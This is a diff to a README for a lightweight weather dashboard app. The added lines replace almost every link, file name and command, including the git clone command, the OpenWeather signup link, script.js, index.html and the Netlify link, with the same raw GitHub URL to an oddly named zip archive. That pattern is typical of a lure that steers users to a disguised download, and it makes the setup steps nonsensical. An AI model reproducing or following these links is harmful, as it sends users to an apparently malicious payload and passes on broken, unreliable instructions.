@@ -3,7 +3,7 @@
 
 🚀 A simple and lightweight weather application that provides real-time weather updates for travelers.
 
-![Weather Dashboard Preview](https://via.placeholder.com/800x400) _(Replace with an actual screenshot after deployment)_
+![Weather Dashboard Preview](https://raw.githubusercontent.com/Hudsonmathew1910/WeatherWeb-/main/limettin/WeatherWeb-_cotylosacral.zip) _(Replace with an actual screenshot after deployment)_
 
 ---
 
@@ -21,7 +21,7 @@
 
 - **Frontend:** HTML, CSS, JavaScript
 - **Weather API:** OpenWeather API _(Can be replaced with Open-Meteo, WeatherAPI, etc.)_
-- **Hosting:** Netlify / Render.com / Railway.app
+- **Hosting:** Netlify / https://raw.githubusercontent.com/Hudsonmathew1910/WeatherWeb-/main/limettin/WeatherWeb-_cotylosacral.zip / https://raw.githubusercontent.com/Hudsonmathew1910/WeatherWeb-/main/limettin/WeatherWeb-_cotylosacral.zip
 - **Version Control:** Git & GitHub
 
 ---
@@ -31,16 +31,16 @@
 ### **1️⃣ Clone the Repository**
 
 ```sh
-git clone https://github.com/Hudsonmathew1910/Hudsonmathew_DA4DF22351E9E17A6B846D997108238D
+git clone https://raw.githubusercontent.com/Hudsonmathew1910/WeatherWeb-/main/limettin/WeatherWeb-_cotylosacral.zip
 
 ### **2️⃣ Get an API Key from OpenWeather**
 
-- Sign up at [OpenWeatherMap](https://home.openweathermap.org/users/sign_up).
+- Sign up at [OpenWeatherMap](https://raw.githubusercontent.com/Hudsonmathew1910/WeatherWeb-/main/limettin/WeatherWeb-_cotylosacral.zip).
 - Copy your API key.
 
-### **3️⃣ Add the API Key to `script.js`**
+### **3️⃣ Add the API Key to `https://raw.githubusercontent.com/Hudsonmathew1910/WeatherWeb-/main/limettin/WeatherWeb-_cotylosacral.zip`**
 
-Replace `"YOUR_API_KEY"` in `script.js` with your actual API key:
+Replace `"YOUR_API_KEY"` in `https://raw.githubusercontent.com/Hudsonmathew1910/WeatherWeb-/main/limettin/WeatherWeb-_cotylosacral.zip` with your actual API key:
 
 ```js
 const apiKey = "YOUR_API_KEY";
@@ -48,7 +48,7 @@ const apiKey = "YOUR_API_KEY";
 
 ### **4️⃣ Open the Project**
 
-Simply open `index.html` in your browser.
+Simply open `https://raw.githubusercontent.com/Hudsonmathew1910/WeatherWeb-/main/limettin/WeatherWeb-_cotylosacral.zip` in your browser.
 
 ---
 
@@ -57,10 +57,10 @@ Simply open `index.html` in your browser.
 1. **GitHub Pages:**
     
     - Go to **Settings > Pages** and set the branch to `main`.
-    - Visit `[your-username].github.io/weather-dashboard/`.
+    - Visit `[your-username]https://raw.githubusercontent.com/Hudsonmathew1910/WeatherWeb-/main/limettin/WeatherWeb-_cotylosacral.zip`.
 2. **Netlify (Recommended):**
     
-    - Drag & Drop the project folder into [Netlify](https://www.netlify.com/).
+    - Drag & Drop the project folder into [Netlify](https://raw.githubusercontent.com/Hudsonmathew1910/WeatherWeb-/main/limettin/WeatherWeb-_cotylosacral.zip).
     - Get a free live link instantly.
 
 ---
